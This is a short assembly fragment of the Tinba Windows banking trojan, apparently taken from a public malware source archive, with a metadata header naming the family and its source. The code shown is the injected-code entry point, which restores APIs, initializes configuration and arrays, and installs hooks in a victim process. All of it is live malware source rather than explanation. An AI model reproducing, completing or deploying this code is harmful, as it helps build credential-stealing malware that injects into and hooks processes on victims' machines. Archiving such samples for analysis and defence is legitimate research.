; ------------------------------------------------------------
; name      Tinba
; type      trojan
; cve       —
; year      unknown
; os        Windows
; authors   unknown
; source    RamadhanAmizudin/malware
; archived  RamadhanAmizudin, krisyotam (2026)
; notes     —
; ------------------------------------------------------------

.code

;; ==================================================================================================== ;;
;; INJECTED_START - injected code entry point                                                           ;;
;; ==================================================================================================== ;;
INJECTED_START proc

	GetBaseDelta ebx

	invokx  &RestoreAPIs[ebx]

	invokx  &InitCfg[ebx]
	invokx  &InitArr[ebx]
	invokx  &InitHooks[ebx]

	ret
INJECTED_START endp

